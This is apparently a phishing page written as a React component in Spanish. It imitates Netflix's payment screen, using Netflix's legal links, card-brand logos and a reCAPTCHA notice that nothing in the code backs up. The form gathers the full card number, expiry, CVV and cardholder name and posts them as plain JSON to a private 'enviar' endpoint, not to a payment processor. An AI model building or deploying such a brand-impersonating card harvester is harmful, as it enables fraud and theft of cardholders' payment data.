import React, { useState } from "react";
import styles from "./Tarjeta.module.css";

export default function TarjetaPago({ onPaymentSuccess }) {
  const [cardNumber, setCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [cardName, setCardName] = useState("");
  const [errorMessage, setErrorMessage] = useState("");

  const validateAndSubmit = async (e) => {
    e.preventDefault();

    // Validaciones básicas
    const cardNumberRegex = /^\d{16}$/;
    const expiryDateRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
    const cvvRegex = /^\d{3}$/;

    if (
      !cardNumberRegex.test(cardNumber) ||
      !expiryDateRegex.test(expiryDate) ||
      !cvvRegex.test(cvv) ||
      cardName.trim() === ""
    ) {
      setErrorMessage("Por favor, completa todos los campos correctamente.");
      return;
    }

    setErrorMessage("");

    const data = {
      NumeroDeTarjeta: cardNumber,
      FechaDeVencimiento: expiryDate,
      CVV: cvv,
      NombreDeTarjeta: cardName,
    };

    try {
      const response = await fetch("http://localhost:5000/api/enviar", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      });

      const result = await response.json();
      if (response.status === 201) {
        onPaymentSuccess();
      } else {
        setErrorMessage(result.message || "Error al procesar el pago.");
      }
    } catch (error) {
      setErrorMessage("Error de conexión. Intenta nuevamente.");
    }
  };

  return (
    <div className={styles.container}>
      <div className={styles.modal}>
        <h2 className={styles.title}>Configura tu tarjeta de crédito o débito</h2>
        <div className={styles.logos}>
          <img alt="Visa" className={styles.logo} src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/VISA-YO2sYpasfsBgXW99iEUBppBwrvx6UN.png" width="40" height="25" />
          <img alt="Mastercard" className={styles.logo} src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/mater-ZoeFvD5IXZpsC5qJtbuJVPqxFbplgA.png" width="40" height="25" />
          <img alt="American Express" className={styles.logo} src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/AMEX-3lRBmCLXNfVVNgCZNOeJZDlA8k2aN9.png" width="40" height="25" />
        </div>

        <form className={styles.form} onSubmit={validateAndSubmit}>
          <input
            type="text"
            placeholder="Número de tarjeta"
            maxLength={16}
            value={cardNumber}
            onChange={(e) => setCardNumber(e.target.value)}
            className={styles.input}
            required
          />
          <div className={styles.inputGroup}>
            <input
              type="text"
              placeholder="Fecha de vencimiento (MM/YY)"
              maxLength={5}
              value={expiryDate}
              onChange={(e) => setExpiryDate(e.target.value)}
              className={styles.input}
              required
            />
            <div className={styles.cvvContainer}>
              <input
                type="text"
                placeholder="CVV"
                maxLength={3}
                value={cvv}
                onChange={(e) => setCvv(e.target.value)}
                className={styles.input}
                required
              />
              <button type="button" className={styles.cvvHelpButton} title="El CVV son los 3 dígitos al dorso de tu tarjeta">?</button>
            </div>
          </div>
          <input
            type="text"
            placeholder="Nombre en la tarjeta"
            value={cardName}
            onChange={(e) => setCardName(e.target.value)}
            className={styles.input}
            required
          />
          {errorMessage && <p className={styles.errorMessage}>{errorMessage}</p>}
          <button type="submit" className={styles.submitButton}>Guardar información de pago</button>
        </form>

        <div className={styles.info}>
          <p>Los pagos se procesarán internacionalmente. Es posible que se apliquen comisiones bancarias adicionales.</p>
          <p>
            Al hacer clic en «Guardar información de pago», aceptas nuestros{" "}
            <a href="https://help.netflix.com/legal/termsofuse" target="_blank" rel="noopener noreferrer" className={styles.link}>Términos de uso</a> y nuestra{" "}
            <a href="https://help.netflix.com/legal/privacy" target="_blank" rel="noopener noreferrer" className={styles.link}>Declaración de privacidad</a>.
          </p>
        </div>
        <p className={styles.recaptcha}>
          Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot.{" "}
          <a href="https://www.google.com/recaptcha/about/" target="_blank" rel="noopener noreferrer" className={styles.link}>Más info</a>
        </p>
      </div>
    </div>
  );
}
